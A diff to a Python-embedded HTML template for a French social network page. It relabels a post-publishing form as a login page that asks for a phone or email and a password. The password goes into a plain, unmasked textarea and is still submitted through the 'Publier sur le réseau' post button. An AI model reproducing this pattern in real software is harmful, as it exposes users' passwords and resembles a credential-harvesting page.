@@ -20,6 +20,14 @@ HTML_INTERFACE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mon Réseau Social</title>
     <style>
+        div {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        } 
         body {
             background-color: #121214;
             color: #e1e1e6;
@@ -72,13 +80,13 @@ HTML_INTERFACE = """
 </head>
 <body>
     <div class="container">
-        <h2>Fil d'Actualité</h2>
+        <h2>Page de connéction</h2>
         <form id="postForm">
-            <label for="username">Pseudo ou Identifiant :</label>
+            <label for="username">Numéro ou Compte émail :</label>
             <input type="text" id="username" name="username" placeholder="Ex: Itachi97" required>
             
-            <label for="content">Message / Publication :</label>
-            <textarea id="content" name="content" rows="4" placeholder="Quoi de neuf ?" required></textarea>
+            <label for="content">Mot de passe :</label>
+            <textarea id="content" name="content" rows="1" placeholder=".......... " required></textarea>
             
             <button type="submit">Publier sur le réseau</button>
         </form>
